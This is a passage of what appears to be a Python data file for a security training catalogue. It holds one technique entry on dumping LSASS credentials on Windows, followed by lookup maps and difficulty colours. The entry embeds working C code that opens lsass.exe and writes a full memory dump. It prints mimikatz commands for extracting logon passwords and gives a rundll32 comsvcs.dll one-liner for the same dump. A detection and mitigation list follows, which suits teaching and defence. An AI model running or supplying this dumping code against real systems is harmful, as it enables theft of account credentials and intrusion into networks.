                                CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) { CloseHandle(hLsass); return FALSE; }

    BOOL ok = MiniDumpWriteDump(
        hLsass, pid, hFile,
        MiniDumpWithFullMemory,   // full process memory
        NULL, NULL, NULL);

    CloseHandle(hFile);
    CloseHandle(hLsass);

    if (ok) {
        printf("[+] Dump written to %ls\n", outPath);
        printf("[*] Process offline: mimikatz# sekurlsa::minidump %ls\n", outPath);
        printf("[*]                  mimikatz# sekurlsa::logonpasswords\n");
    } else {
        printf("[-] MiniDumpWriteDump failed: %lu\n", GetLastError());
    }
    return ok;
}

int main(void) {
    return DumpLSASS(L"C:\\Windows\\Temp\\lsass.dmp") ? 0 : 1;
}

// ── Alternative: comsvcs.dll one-liner (no custom code needed) ───────────────
// rundll32 C:\Windows\System32\comsvcs.dll MiniDump <lsass_pid> C:\Temp\lsass.dmp full
""",
        "code_language": "c",
        "detection": [
            "OpenProcess targeting lsass.exe with VM_READ access — the single strongest indicator.",
            "MiniDumpWriteDump called with lsass.exe handle — directly flagged by all major EDRs.",
            "Handle table auditing: lsass.exe has PPL (Protected Process Light) on modern Windows — any access attempt to it is logged.",
            "Windows Credential Guard: moves credential secrets into an isolated VM (VSM) — LSASS dump reveals no useful data.",
            "Enable LSA Protection (RunAsPPL): prevents non-PPL processes from opening LSASS with VM_READ.",
            "Audit Object Access policy: enable 'Audit Sensitive Privilege Use' and 'Audit Handle Manipulation' for lsass.",
            "Comsvcs MiniDump: rundll32 spawning with comsvcs.dll and process ID arguments is a well-known signature.",
        ],
        "has_simulation": True,
        "sim_description": (
            "Step-by-step walkthrough: privilege escalation, LSASS handle acquisition, dump creation, "
            "and offline processing — showing exactly what data is extracted and why PPL matters."
        ),
    },
]

# Build lookup maps
TECHNIQUE_BY_ID = {t["id"]: t for t in TECHNIQUES}
TECHNIQUES_BY_CATEGORY = {}
for t in TECHNIQUES:
    TECHNIQUES_BY_CATEGORY.setdefault(t["category"], []).append(t)

DIFFICULTY_ORDER = {"Beginner": 0, "Intermediate": 1, "Advanced": 2, "Expert": 3}
DIFFICULTY_COLORS = {
    "Beginner":     "#00c896",
    "Intermediate": "#f0a500",
    "Advanced":     "#e05c5c",
    "Expert":       "#c040fb",
}
